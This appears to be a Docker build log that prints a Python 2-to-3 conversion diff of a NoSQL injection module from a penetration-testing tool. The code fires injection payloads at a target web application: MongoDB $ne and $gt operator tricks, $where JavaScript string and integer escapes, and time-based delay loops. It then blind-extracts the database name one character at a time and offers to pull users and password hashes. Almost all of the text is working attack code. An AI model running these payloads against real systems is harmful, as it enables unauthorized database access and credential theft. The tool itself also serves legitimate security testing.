+#8 6.524          appURL = "https://" + str(victim) + ":" + str(webPort) + str(uri)
+#8 6.524  
+#8 6.524      try:
+#8 6.524 -        body = urllib.urlencode(postData)
+#8 6.524 -        req = urllib2.Request(appURL,body, requestHeaders)
+#8 6.524 -        appRespCode = urllib2.urlopen(req).getcode()
+#8 6.524 +        body = urllib.parse.urlencode(postData)
+#8 6.524 +        req = urllib.request.Request(appURL,body, requestHeaders)
+#8 6.524 +        appRespCode = urllib.request.urlopen(req).getcode()
+#8 6.524  
+#8 6.524          if appRespCode == 200:
+#8 6.524  
+#8 6.524              normLength = int(len(getResponseBodyHandlingErrors(req)))
+#8 6.524 -            timeReq = urllib2.urlopen(req)
+#8 6.524 +            timeReq = urllib.request.urlopen(req)
+#8 6.524              start = time.time()
+#8 6.524              page = timeReq.read()
+#8 6.524              end = time.time()
+#8 6.524 @@ -438,46 +438,46 @@
+#8 6.524              timeBase = round((end - start), 3)
+#8 6.524  
+#8 6.524              if verb == "ON":
+#8 6.524 -                print "App is up! Got response length of " + str(normLength) + " and response time of " + str(timeBase) + " seconds.  Starting injection test.\n"
+#8 6.524 -
+#8 6.524 -            else:
+#8 6.524 -                print "App is up!"
+#8 6.524 +                print("App is up! Got response length of " + str(normLength) + " and response time of " + str(timeBase) + " seconds.  Starting injection test.\n")
+#8 6.524 +
+#8 6.524 +            else:
+#8 6.524 +                print("App is up!")
+#8 6.524              appUp = True
+#8 6.524          else:
+#8 6.524 -            print "Got " + str(appRespCode) + "from the app, check your options."
+#8 6.524 -
+#8 6.524 -    except NoSQLMapException,e:
+#8 6.524 -        print e
+#8 6.524 -        print "Looks like the server didn't respond.  Check your options."
+#8 6.524 +            print("Got " + str(appRespCode) + "from the app, check your options.")
+#8 6.524 +
+#8 6.524 +    except NoSQLMapException as e:
+#8 6.524 +        print(e)
+#8 6.524 +        print("Looks like the server didn't respond.  Check your options.")
+#8 6.524  
+#8 6.524      if appUp == True:
+#8 6.524  
+#8 6.524          menuItem = 1
+#8 6.524 -        print "List of parameters:"
+#8 6.524 -        for params in postData.keys():
+#8 6.524 -            print str(menuItem) + "-" + params
+#8 6.524 +        print("List of parameters:")
+#8 6.524 +        for params in list(postData.keys()):
+#8 6.524 +            print(str(menuItem) + "-" + params)
+#8 6.524              menuItem += 1
+#8 6.524  
+#8 6.524          try:
+#8 6.524              if args == None:
+#8 6.524 -                injIndex = raw_input("Which parameter should we inject? ")
+#8 6.524 +                injIndex = input("Which parameter should we inject? ")
+#8 6.524              else:
+#8 6.524                  injIndex = int(args.injectedParameter)
+#8 6.524 -            injOpt = str(postData.keys()[int(injIndex)-1])
+#8 6.524 -            print "Injecting the " + injOpt + " parameter..."
+#8 6.524 +            injOpt = str(list(postData.keys())[int(injIndex)-1])
+#8 6.524 +            print("Injecting the " + injOpt + " parameter...")
+#8 6.524          except NoSQLMapException:
+#8 6.524              if args == None:
+#8 6.524 -                raw_input("Something went wrong.  Press enter to return to the main menu...")
+#8 6.524 +                input("Something went wrong.  Press enter to return to the main menu...")
+#8 6.524              return
+#8 6.524  
+#8 6.524          if args == None:
+#8 6.524              sizeSelect = True
+#8 6.524  
+#8 6.524              while sizeSelect:
+#8 6.524 -                injectSize = raw_input("Baseline test-Enter random string size: ")
+#8 6.524 +                injectSize = input("Baseline test-Enter random string size: ")
+#8 6.524                  sizeSelect = not injectSize.isdigit()
+#8 6.524                  if sizeSelect:
+#8 6.524 -                    print "Invalid! The size should be an integer."
+#8 6.524 +                    print("Invalid! The size should be an integer.")
+#8 6.524  
+#8 6.524              format = randInjString(int(injectSize))
+#8 6.524          else:
+#8 6.524 @@ -487,39 +487,39 @@
+#8 6.524          injectSize = int(injectSize)
+#8 6.524          injectString = build_random_string(format, injectSize)
+#8 6.524                  
+#8 6.524 -        print "Using " + injectString + " for injection testing.\n"
+#8 6.524 +        print("Using " + injectString + " for injection testing.\n")
+#8 6.524  
+#8 6.524          # Build a random string and insert; if the app handles input correctly, a random string and injected code should be treated the same.
+#8 6.524          # Add error handling for Non-200 HTTP response codes if random strings freak out the app.
+#8 6.524          postData.update({injOpt:injectString})
+#8 6.524          if verb == "ON":
+#8 6.524 -            print "Checking random injected parameter HTTP response size sending " + str(postData) +"...\n"
+#8 6.524 -        else:
+#8 6.524 -            print "Sending random parameter value..."
+#8 6.524 -
+#8 6.524 -        body = urllib.urlencode(postData)
+#8 6.524 -        req = urllib2.Request(appURL,body, requestHeaders)
+#8 6.524 +            print("Checking random injected parameter HTTP response size sending " + str(postData) +"...\n")
+#8 6.524 +        else:
+#8 6.524 +            print("Sending random parameter value...")
+#8 6.524 +
+#8 6.524 +        body = urllib.parse.urlencode(postData)
+#8 6.524 +        req = urllib.request.Request(appURL,body, requestHeaders)
+#8 6.524          randLength = int(len(getResponseBodyHandlingErrors(req)))
+#8 6.524 -        print "Got response length of " + str(randLength) + "."
+#8 6.524 +        print("Got response length of " + str(randLength) + ".")
+#8 6.524  
+#8 6.524          randNormDelta = abs(normLength - randLength)
+#8 6.524  
+#8 6.524          if randNormDelta == 0:
+#8 6.524 -            print "No change in response size injecting a random parameter..\n"
+#8 6.524 -        else:
+#8 6.524 -            print "Random value variance: " + str(randNormDelta) + "\n"
+#8 6.524 +            print("No change in response size injecting a random parameter..\n")
+#8 6.524 +        else:
+#8 6.524 +            print("Random value variance: " + str(randNormDelta) + "\n")
+#8 6.524  
+#8 6.524          # Generate not equals injection
+#8 6.524          neDict = postData
+#8 6.524          neDict[injOpt + "[$ne]"] = neDict[injOpt]
+#8 6.524          del neDict[injOpt]
+#8 6.524 -        body = urllib.urlencode(neDict)
+#8 6.524 -        req = urllib2.Request(appURL,body, requestHeaders)
+#8 6.524 -        if verb == "ON":
+#8 6.524 -            print "Testing Mongo PHP not equals associative array injection using " + str(postData) +"..."
+#8 6.524 -
+#8 6.524 -        else:
+#8 6.524 -            print "Test 1: PHP/ExpressJS != associative array injection"
+#8 6.524 +        body = urllib.parse.urlencode(neDict)
+#8 6.524 +        req = urllib.request.Request(appURL,body, requestHeaders)
+#8 6.524 +        if verb == "ON":
+#8 6.524 +            print("Testing Mongo PHP not equals associative array injection using " + str(postData) +"...")
+#8 6.524 +
+#8 6.524 +        else:
+#8 6.524 +            print("Test 1: PHP/ExpressJS != associative array injection")
+#8 6.524  
+#8 6.524          errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
+#8 6.524  
+#8 6.524 @@ -530,7 +530,7 @@
+#8 6.524  
+#8 6.524          else:
+#8 6.524              testNum +=1
+#8 6.524 -        print "\n"
+#8 6.524 +        print("\n")
+#8 6.524  
+#8 6.524          # Delete the extra key
+#8 6.524          del postData[injOpt + "[$ne]"]
+#8 6.524 @@ -540,13 +540,13 @@
+#8 6.524          gtDict.update({injOpt:""})
+#8 6.524          gtDict[injOpt + "[$gt]"] = gtDict[injOpt]
+#8 6.524          del gtDict[injOpt]
+#8 6.524 -        body = urllib.urlencode(gtDict)
+#8 6.524 -        req = urllib2.Request(appURL,body, requestHeaders)
+#8 6.524 -        if verb == "ON":
+#8 6.524 -            print "Testing PHP/ExpressJS >Undefined Injection using " + str(postData) + "..."
+#8 6.524 -
+#8 6.524 -        else:
+#8 6.524 -            print "Test 2:  PHP/ExpressJS > Undefined Injection"
+#8 6.524 +        body = urllib.parse.urlencode(gtDict)
+#8 6.524 +        req = urllib.request.Request(appURL,body, requestHeaders)
+#8 6.524 +        if verb == "ON":
+#8 6.524 +            print("Testing PHP/ExpressJS >Undefined Injection using " + str(postData) + "...")
+#8 6.524 +
+#8 6.524 +        else:
+#8 6.524 +            print("Test 2:  PHP/ExpressJS > Undefined Injection")
+#8 6.524  
+#8 6.524          errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
+#8 6.524  
+#8 6.524 @@ -556,14 +556,14 @@
+#8 6.524              testNum += 1
+#8 6.524  
+#8 6.524          postData.update({injOpt:"a'; return db.a.find(); var dummy='!"})
+#8 6.524 -        body = urllib.urlencode(postData)
+#8 6.524 -        req = urllib2.Request(appURL,body, requestHeaders)
+#8 6.524 -        if verb == "ON":
+#8 6.524 -            print "Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n"
+#8 6.524 -            print "Injecting " + str(postData)
+#8 6.524 -
+#8 6.524 -        else:
+#8 6.524 -            print "Test 3: $where injection (string escape)"
+#8 6.524 +        body = urllib.parse.urlencode(postData)
+#8 6.524 +        req = urllib.request.Request(appURL,body, requestHeaders)
+#8 6.524 +        if verb == "ON":
+#8 6.524 +            print("Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n")
+#8 6.524 +            print("Injecting " + str(postData))
+#8 6.524 +
+#8 6.524 +        else:
+#8 6.524 +            print("Test 3: $where injection (string escape)")
+#8 6.524  
+#8 6.524          errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
+#8 6.524  
+#8 6.524 @@ -574,16 +574,16 @@
+#8 6.524          else:
+#8 6.524              testNum += 1
+#8 6.524  
+#8 6.524 -        print "\n"
+#8 6.524 +        print("\n")
+#8 6.524  
+#8 6.524          postData.update({injOpt:"1; return db.a.find(); var dummy=1"})
+#8 6.524 -        body = urllib.urlencode(postData)
+#8 6.524 -        req = urllib2.Request(appURL,body, requestHeaders)
+#8 6.524 -        if verb == "ON":
+#8 6.524 -            print "Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n"
+#8 6.524 -            print "Injecting " + str(postData)
+#8 6.524 -        else:
+#8 6.524 -            print "Test 4: $where injection (integer escape)"
+#8 6.524 +        body = urllib.parse.urlencode(postData)
+#8 6.524 +        req = urllib.request.Request(appURL,body, requestHeaders)
+#8 6.524 +        if verb == "ON":
+#8 6.524 +            print("Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n")
+#8 6.524 +            print("Injecting " + str(postData))
+#8 6.524 +        else:
+#8 6.524 +            print("Test 4: $where injection (integer escape)")
+#8 6.524  
+#8 6.524          errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
+#8 6.524  
+#8 6.524 @@ -593,18 +593,18 @@
+#8 6.524              testNum += 1
+#8 6.524          else:
+#8 6.524              testNum += 1
+#8 6.524 -        print "\n"
+#8 6.524 +        print("\n")
+#8 6.524  
+#8 6.524          # Start a single record attack in case the app expects only one record back
+#8 6.524          postData.update({injOpt:"a'; return db.a.findOne(); var dummy='!"})
+#8 6.524 -        body = urllib.urlencode(postData)
+#8 6.524 -        req = urllib2.Request(appURL,body, requestHeaders)
+#8 6.524 -        if verb == "ON":
+#8 6.524 -            print "Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n"
+#8 6.524 -            print " Injecting " + str(postData)
+#8 6.524 -
+#8 6.524 -        else:
+#8 6.524 -            print "Test 5: $where injection string escape (single record)"
+#8 6.524 +        body = urllib.parse.urlencode(postData)
+#8 6.524 +        req = urllib.request.Request(appURL,body, requestHeaders)
+#8 6.524 +        if verb == "ON":
+#8 6.524 +            print("Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n")
+#8 6.524 +            print(" Injecting " + str(postData))
+#8 6.524 +
+#8 6.524 +        else:
+#8 6.524 +            print("Test 5: $where injection string escape (single record)")
+#8 6.524  
+#8 6.524          errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
+#8 6.524  
+#8 6.524 @@ -615,17 +615,17 @@
+#8 6.524  
+#8 6.524          else:
+#8 6.524              testNum += 1
+#8 6.524 -        print "\n"
+#8 6.524 +        print("\n")
+#8 6.524  
+#8 6.524          postData.update({injOpt:"1; return db.a.findOne(); var dummy=1"})
+#8 6.524 -        body = urllib.urlencode(postData)
+#8 6.524 -        req = urllib2.Request(appURL,body, requestHeaders)
+#8 6.524 -        if verb == "ON":
+#8 6.524 -            print "Testing Mongo <2.4 $where Javascript integer escape attack for one record...\n"
+#8 6.524 -            print " Injecting " + str(postData)
+#8 6.524 -
+#8 6.524 -        else:
+#8 6.524 -            print "Test 6: $where injection integer escape (single record)"
+#8 6.524 +        body = urllib.parse.urlencode(postData)
+#8 6.524 +        req = urllib.request.Request(appURL,body, requestHeaders)
+#8 6.524 +        if verb == "ON":
+#8 6.524 +            print("Testing Mongo <2.4 $where Javascript integer escape attack for one record...\n")
+#8 6.524 +            print(" Injecting " + str(postData))
+#8 6.524 +
+#8 6.524 +        else:
+#8 6.524 +            print("Test 6: $where injection integer escape (single record)")
+#8 6.524  
+#8 6.524          errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
+#8 6.524  
+#8 6.524 @@ -636,18 +636,18 @@
+#8 6.524  
+#8 6.524          else:
+#8 6.524              testNum += 1
+#8 6.524 -        print "\n"
+#8 6.524 +        print("\n")
+#8 6.524  
+#8 6.524          postData.update({injOpt:"a'; return this.a != '" + injectString + "'; var dummy='!"})
+#8 6.524 -        body = urllib.urlencode(postData)
+#8 6.524 -        req = urllib2.Request(appURL,body, requestHeaders)
+#8 6.524 -
+#8 6.524 -        if verb == "ON":
+#8 6.524 -            print "Testing Mongo this not equals string escape attack for all records..."
+#8 6.524 -            print " Injecting " + str(postData)
+#8 6.524 -
+#8 6.524 -        else:
+#8 6.524 -            print "Test 7: This != injection (string escape)"
+#8 6.524 +        body = urllib.parse.urlencode(postData)
+#8 6.524 +        req = urllib.request.Request(appURL,body, requestHeaders)
+#8 6.524 +
+#8 6.524 +        if verb == "ON":
+#8 6.524 +            print("Testing Mongo this not equals string escape attack for all records...")
+#8 6.524 +            print(" Injecting " + str(postData))
+#8 6.524 +
+#8 6.524 +        else:
+#8 6.524 +            print("Test 7: This != injection (string escape)")
+#8 6.524  
+#8 6.524          errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
+#8 6.524  
+#8 6.524 @@ -655,19 +655,19 @@
+#8 6.524              injLen = int(len(getResponseBodyHandlingErrors(req)))
+#8 6.524              checkResult(randLength,injLen,testNum,verb,postData)
+#8 6.524              testNum += 1
+#8 6.524 -            print "\n"
+#8 6.524 +            print("\n")
+#8 6.524          else:
+#8 6.524              testNum += 1
+#8 6.524  
+#8 6.524          postData.update({injOpt:"1; return this.a != '" + injectString + "'; var dummy=1"})
+#8 6.524 -        body = urllib.urlencode(postData)
+#8 6.524 -        req = urllib2.Request(appURL,body, requestHeaders)
+#8 6.524 -
+#8 6.524 -        if verb == "ON":
+#8 6.524 -            print "Testing Mongo this not equals integer escape attack for all records..."
+#8 6.524 -            print " Injecting " + str(postData)
+#8 6.524 -        else:
+#8 6.524 -            print "Test 8:  This != injection (integer escape)"
+#8 6.524 +        body = urllib.parse.urlencode(postData)
+#8 6.524 +        req = urllib.request.Request(appURL,body, requestHeaders)
+#8 6.524 +
+#8 6.524 +        if verb == "ON":
+#8 6.524 +            print("Testing Mongo this not equals integer escape attack for all records...")
+#8 6.524 +            print(" Injecting " + str(postData))
+#8 6.524 +        else:
+#8 6.524 +            print("Test 8:  This != injection (integer escape)")
+#8 6.524  
+#8 6.524          errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
+#8 6.524  
+#8 6.524 @@ -678,85 +678,85 @@
+#8 6.524  
+#8 6.524          else:
+#8 6.524              testNum += 1
+#8 6.524 -        print "\n"
+#8 6.524 +        print("\n")
+#8 6.524  
+#8 6.524          doTimeAttack = "N"
+#8 6.524          if args == None:        
+#8 6.524 -            doTimeAttack = raw_input("Start timing based tests (y/n)? ")
+#8 6.524 +            doTimeAttack = input("Start timing based tests (y/n)? ")
+#8 6.524  
+#8 6.524          if doTimeAttack == "y" or doTimeAttack == "Y":
+#8 6.524 -            print "Starting Javascript string escape time based injection..."
+#8 6.524 +            print("Starting Javascript string escape time based injection...")
+#8 6.524              postData.update({injOpt:"a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(curDate.getTime()-date.getTime()))/1000 < 10); return true; var dummy='a"})
+#8 6.524 -            body = urllib.urlencode(postData)
+#8 6.524 -            conn = urllib2.urlopen(req,body)
+#8 6.524 +            body = urllib.parse.urlencode(postData)
+#8 6.524 +            conn = urllib.request.urlopen(req,body)
+#8 6.524              start = time.time()
+#8 6.524              page = conn.read()
+#8 6.524              end = time.time()
+#8 6.524              conn.close()
+#8 6.524 -            print str(end)
+#8 6.524 -            print str(start)
+#8 6.524 +            print(str(end))
+#8 6.524 +            print(str(start))
+#8 6.524              strTimeDelta = (int(round((end - start), 3)) - timeBase)
+#8 6.524              #print str(strTimeDelta)
+#8 6.524              if strTimeDelta > 25:
+#8 6.524 -                print "HTTP load time variance was " + str(strTimeDelta) +"  seconds! Injection possible."
+#8 6.524 +                print("HTTP load time variance was " + str(strTimeDelta) +"  seconds! Injection possible.")
+#8 6.524                  strTbAttack = True
+#8 6.524  
+#8 6.524              else:
+#8 6.524 -                print "HTTP load time variance was only " + str(strTimeDelta) + " seconds.  Injection probably didn't work."
+#8 6.524 +                print("HTTP load time variance was only " + str(strTimeDelta) + " seconds.  Injection probably didn't work.")
+#8 6.524                  strTbAttack = False
+#8 6.524  
+#8 6.524 -            print "Starting Javascript integer escape time based injection..."
+#8 6.524 +            print("Starting Javascript integer escape time based injection...")
+#8 6.524  
+#8 6.524              postData.update({injOpt:"1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1"})
+#8 6.524 -            body = urllib.urlencode(postData)
+#8 6.524 +            body = urllib.parse.urlencode(postData)
+#8 6.524              start = time.time()
+#8 6.524 -            conn = urllib2.urlopen(req,body)
+#8 6.524 +            conn = urllib.request.urlopen(req,body)
+#8 6.524              page = conn.read()
+#8 6.524              end = time.time()
+#8 6.524              conn.close()
+#8 6.524 -            print str(end)
+#8 6.524 -            print str(start)
+#8 6.524 +            print(str(end))
+#8 6.524 +            print(str(start))
+#8 6.524              intTimeDelta = ((end-start) - timeBase)
+#8 6.524              #print str(strTimeDelta)
+#8 6.524              if intTimeDelta > 25:
+#8 6.524 -                print "HTTP load time variance was " + str(intTimeDelta) +" seconds! Injection possible."
+#8 6.524 +                print("HTTP load time variance was " + str(intTimeDelta) +" seconds! Injection possible.")
+#8 6.524                  intTbAttack = True
+#8 6.524  
+#8 6.524              else:
+#8 6.524 -                print "HTTP load time variance was only " + str(intTimeDelta) + " seconds.  Injection probably didn't work."
+#8 6.524 +                print("HTTP load time variance was only " + str(intTimeDelta) + " seconds.  Injection probably didn't work.")
+#8 6.524                  intTbAttack = False
+#8 6.524  
+#8 6.524 -        print "\n"
+#8 6.524 -        print "Exploitable requests:"
+#8 6.524 -        print "\n".join(vulnAddrs)
+#8 6.524 -        print "\n"
+#8 6.524 -        print "Possibly vulnerable requests:"
+#8 6.524 -        print"\n".join(possAddrs)
+#8 6.524 -        print "\n"
+#8 6.524 -        print "Timing based attacks:"
+#8 6.524 +        print("\n")
+#8 6.524 +        print("Exploitable requests:")
+#8 6.524 +        print("\n".join(vulnAddrs))
+#8 6.524 +        print("\n")
+#8 6.524 +        print("Possibly vulnerable requests:")
+#8 6.524 +        print("\n".join(possAddrs))
+#8 6.524 +        print("\n")
+#8 6.524 +        print("Timing based attacks:")
+#8 6.524  
+#8 6.524          if strTbAttack == True:
+#8 6.524 -            print "String attack-Successful"
+#8 6.524 -        else:
+#8 6.524 -            print "String attack-Unsuccessful"
+#8 6.524 +            print("String attack-Successful")
+#8 6.524 +        else:
+#8 6.524 +            print("String attack-Unsuccessful")
+#8 6.524          if intTbAttack == True:
+#8 6.524 -            print "Integer attack-Successful"
+#8 6.524 -        else:
+#8 6.524 -            print "Integer attack-Unsuccessful"
+#8 6.524 +            print("Integer attack-Successful")
+#8 6.524 +        else:
+#8 6.524 +            print("Integer attack-Unsuccessful")
+#8 6.524  
+#8 6.524          if args == None:
+#8 6.524 -            fileOut = raw_input("Save results to file (y/n)? ")
+#8 6.524 +            fileOut = input("Save results to file (y/n)? ")
+#8 6.524          else:
+#8 6.524              fileOut = "y" if args.savePath else "n"
+#8 6.524  
+#8 6.524          if fileOut.lower() == "y":
+#8 6.524              if args == None:
+#8 6.524 -                savePath = raw_input("Enter output file name: ")
+#8 6.524 +                savePath = input("Enter output file name: ")
+#8 6.524              else:
+#8 6.524                  savePath = args.savePath
+#8 6.524              save_to(savePath, vulnAddrs, possAddrs, strTbAttack,intTbAttack)
+#8 6.524      if args == None:
+#8 6.524 -        raw_input("Press enter to continue...")
+#8 6.524 +        input("Press enter to continue...")
+#8 6.524      return()
+#8 6.524  
+#8 6.524  
+#8 6.524 @@ -768,7 +768,7 @@
+#8 6.524      global postData
+#8 6.524  
+#8 6.524      if errorCheck.find('ReferenceError') != -1 or errorCheck.find('SyntaxError') != -1 or errorCheck.find('ILLEGAL') != -1:
+#8 6.524 -        print "Injection returned a MongoDB Error.  Injection may be possible."
+#8 6.524 +        print("Injection returned a MongoDB Error.  Injection may be possible.")
+#8 6.524  
+#8 6.524          if httpMethod == "GET":
+#8 6.524              possAddrs.append(uriArray[testNum])
+#8 6.524 @@ -805,9 +805,9 @@
+#8 6.524      delta = abs(respSize - baseSize)
+#8 6.524      if (delta >= 100) and (respSize != 0) :
+#8 6.524          if verb == "ON":
+#8 6.524 -            print "Response varied " + str(delta) + " bytes from random parameter value! Injection works!"
+#8 6.524 -        else:
+#8 6.524 -            print "Successful injection!"
+#8 6.524 +            print("Response varied " + str(delta) + " bytes from random parameter value! Injection works!")
+#8 6.524 +        else:
+#8 6.524 +            print("Successful injection!")
+#8 6.524  
+#8 6.524          if httpMethod == "GET":
+#8 6.524              vulnAddrs.append(uriArray[testNum])
+#8 6.524 @@ -831,9 +831,9 @@
+#8 6.524  
+#8 6.524      elif (delta > 0) and (delta < 100) and (respSize != 0) :
+#8 6.524          if verb == "ON":
+#8 6.524 -            print "Response variance was only " + str(delta) + " bytes. Injection might have worked but difference is too small to be certain. "
+#8 6.524 -        else:
+#8 6.524 -            print "Possible injection."
+#8 6.524 +            print("Response variance was only " + str(delta) + " bytes. Injection might have worked but difference is too small to be certain. ")
+#8 6.524 +        else:
+#8 6.524 +            print("Possible injection.")
+#8 6.524  
+#8 6.524          if httpMethod == "GET":
+#8 6.524              possAddrs.append(uriArray[testNum])
+#8 6.524 @@ -846,16 +846,16 @@
+#8 6.524  
+#8 6.524      elif (delta == 0):
+#8 6.524          if verb == "ON":
+#8 6.524 -            print "Random string response size and not equals injection were the same. Injection did not work."
+#8 6.524 -        else:
+#8 6.524 -            print "Injection failed."
+#8 6.524 +            print("Random string response size and not equals injection were the same. Injection did not work.")
+#8 6.524 +        else:
+#8 6.524 +            print("Injection failed.")
+#8 6.524          return
+#8 6.524  
+#8 6.524      else:
+#8 6.524          if verb == "ON":
+#8 6.524 -            print "Injected response was smaller than random response.  Injection may have worked but requires verification."
+#8 6.524 -        else:
+#8 6.524 -            print "Possible injection."
+#8 6.524 +            print("Injected response was smaller than random response.  Injection may have worked but requires verification.")
+#8 6.524 +        else:
+#8 6.524 +            print("Possible injection.")
+#8 6.524          if httpMethod == "GET":
+#8 6.524              possAddrs.append(uriArray[testNum])
+#8 6.524          else:
+#8 6.524 @@ -867,16 +867,16 @@
+#8 6.524  
+#8 6.524  
+#8 6.524  def randInjString(size):
+#8 6.524 -    print "What format should the random string take?"
+#8 6.524 -    print "1-Alphanumeric"
+#8 6.524 -    print "2-Letters only"
+#8 6.524 -    print "3-Numbers only"
+#8 6.524 -    print "4-Email address"
+#8 6.524 +    print("What format should the random string take?")
+#8 6.524 +    print("1-Alphanumeric")
+#8 6.524 +    print("2-Letters only")
+#8 6.524 +    print("3-Numbers only")
+#8 6.524 +    print("4-Email address")
+#8 6.524  
+#8 6.524      while True:
+#8 6.524 -        format = raw_input("Select an option: ")
+#8 6.524 +        format = input("Select an option: ")
+#8 6.524          if format not in ["1", "2", "3", "4"]:
+#8 6.524 -            print "Invalid selection."
+#8 6.524 +            print("Invalid selection.")
+#8 6.524          else:
+#8 6.524              break
+#8 6.524      return format
+#8 6.524 @@ -911,7 +911,7 @@
+#8 6.524          params = split_uri[1].split("&")
+#8 6.524  
+#8 6.524      except NoSQLMapException:
+#8 6.524 -        raw_input("Not able to parse the URL and parameters.  Check options settings.  Press enter to return to main menu...")
+#8 6.524 +        input("Not able to parse the URL and parameters.  Check options settings.  Press enter to return to main menu...")
+#8 6.524          return
+#8 6.524  
+#8 6.524      for item in params:
+#8 6.524 @@ -920,14 +920,14 @@
+#8 6.524          paramValue.append(item[index + 1:len(item)])
+#8 6.524  
+#8 6.524      menuItem = 1
+#8 6.524 -    print "List of parameters:"
+#8 6.524 +    print("List of parameters:")
+#8 6.524      for params in paramName:
+#8 6.524 -        print str(menuItem) + "-" + params
+#8 6.524 +        print(str(menuItem) + "-" + params)
+#8 6.524          menuItem += 1
+#8 6.524  
+#8 6.524      try:
+#8 6.524          if args == None:
+#8 6.524 -            injIndex = raw_input("Enter parameters to inject in a comma separated list:  ")
+#8 6.524 +            injIndex = input("Enter parameters to inject in a comma separated list:  ")
+#8 6.524          else:
+#8 6.524              injIndex = args.params
+#8 6.524  
+#8 6.524 @@ -937,10 +937,10 @@
+#8 6.524          #injOpt = str(paramName[int(injIndex)-1])
+#8 6.524  
+#8 6.524          for params in injOpt:
+#8 6.524 -            print "Injecting the " + params + " parameter..."
+#8 6.524 +            print("Injecting the " + params + " parameter...")
+#8 6.524  
+#8 6.524      except NoSQLMapException:
+#8 6.524 -        raw_input("Something went wrong.  Press enter to return to the main menu...")
+#8 6.524 +        input("Something went wrong.  Press enter to return to the main menu...")
+#8 6.524          return
+#8 6.524  
+#8 6.524      x = 0
+#8 6.524 @@ -996,7 +996,7 @@
+#8 6.524      x = 0
+#8 6.524      while x <= 18:
+#8 6.524  #        uriArray[x]= uriArray[x][:-1]
+#8 6.524 -        uriArray[x]=split_uri[0]+"?"+urllib.quote_plus(uriArray[x][:-1])
+#8 6.524 +        uriArray[x]=split_uri[0]+"?"+urllib.parse.quote_plus(uriArray[x][:-1])
+#8 6.524  
+#8 6.524          x += 1
+#8 6.524  
+#8 6.524 @@ -1023,39 +1023,39 @@
+#8 6.524      crackHash = ""
+#8 6.524  
+#8 6.524      chars = string.ascii_letters + string.digits
+#8 6.524 -    print "Getting baseline True query return size..."
+#8 6.524 +    print("Getting baseline True query return size...")
+#8 6.524      trueUri = uriArray[16].replace("---","return true; var dummy ='!" + "&")
+#8 6.524      #print "Debug " + str(trueUri)
+#8 6.524 -    req = urllib2.Request(trueUri, None, requestHeaders)
+#8 6.524 +    req = urllib.request.Request(trueUri, None, requestHeaders)
+#8 6.524      baseLen = int(len(getResponseBodyHandlingErrors(req)))
+#8 6.524 -    print "Got baseline true query length of " + str(baseLen)
+#8 6.524 -
+#8 6.524 -    print "Calculating DB name length..."
+#8 6.524 +    print("Got baseline true query length of " + str(baseLen))
+#8 6.524 +
+#8 6.524 +    print("Calculating DB name length...")
+#8 6.524  
+#8 6.524      while gotNameLen == False:
+#8 6.524          calcUri = uriArray[16].replace("---","var curdb = db.getName(); if (curdb.length ==" + str(curLen) + ") {return true;} var dum='a" + "&")
+#8 6.524          #print "Debug: " + calcUri
+#8 6.524 -        req = urllib2.Request(calcUri, None, requestHeaders)
+#8 6.524 +        req = urllib.request.Request(calcUri, None, requestHeaders)
+#8 6.524          lenUri = int(len(getResponseBodyHandlingErrors(req)))
+#8 6.524          #print "Debug length: " + str(lenUri)
+#8 6.524  
+#8 6.524          if lenUri == baseLen:
+#8 6.524 -            print "Got database name length of " + str(curLen) + " characters."
+#8 6.524 +            print("Got database name length of " + str(curLen) + " characters.")
+#8 6.524              gotNameLen = True
+#8 6.524  
+#8 6.524          else:
+#8 6.524              curLen += 1
+#8 6.524  
+#8 6.524 -    print "Database Name: ",
+#8 6.524 +    print("Database Name: ", end=' ')
+#8 6.524      while gotDbName == False:
+#8 6.524          charUri = uriArray[16].replace("---","var curdb = db.getName(); if (curdb.charAt(" + str(nameCounter) + ") == '"+ chars[charCounter] + "') { return true; } var dum='a" + "&")
+#8 6.524  
+#8 6.524 -        req = urllib2.Request(charUri, None, requestHeaders)
+#8 6.524 +        req = urllib.request.Request(charUri, None, requestHeaders)
+#8 6.524          lenUri = int(len(getResponseBodyHandlingErrors(req)))
+#8 6.524  
+#8 6.524          if lenUri == baseLen:
+#8 6.524              dbName = dbName + chars[charCounter]
+#8 6.524 -            print chars[charCounter],
+#8 6.524 +            print(chars[charCounter], end=' ')
+#8 6.524              nameCounter += 1
+#8 6.524              charCounter = 0
+#8 6.524  
+#8 6.524 @@ -1065,9 +1065,9 @@
+#8 6.524  
+#8 6.524          else:
+#8 6.524              charCounter += 1
+#8 6.524 -    print "\n"
+#8 6.524 -
+#8 6.524 -    getUserInf = raw_input("Get database users and password hashes (y/n)? ")
+#8 6.524 +    print("\n")
+#8 6.524 +
+#8 6.524 +    getUserInf = input("Get database users and password hashes (y/n)? ")
+#8 6.524  
+#8 6.524      if getUserInf.lower() == "y":
+#8 6.524          charCounter = 0
+#8 6.524 @@ -1076,11 +1076,11 @@
+#8 6.524          while gotUserCnt == False:
+#8 6.524              usrCntUri = uriArray[16].replace("---","var usrcnt = db.system.users.count(); if (usrcnt == " + str(usrCount) + ") { return true; } var dum='a")
+#8 6.524  
+#8 6.524 -            req = urllib2.Request(usrCntUri, None, requestHeaders)
+#8 6.524 +            req = urllib.request.Request(usrCntUri, None, requestHeaders)
+#8 6.524              lenUri = int(len(getResponseBodyHandlingErrors(req)))
+#8 6.524  
+#8 6.524              if lenUri == baseLen:
+#8 6.524 -                print "Found " + str(usrCount) + " user(s)."
+#8 6.524 +                print("Found " + str(usrCount) + " user(s).")
+#8 6.524                  gotUserCnt = True
+#8 6.524  
+#8 6.524              else:
+#8 6.524 @@ -1102,7 +1102,7 @@
+#8 6.524                      # different query to get the first user vs. others
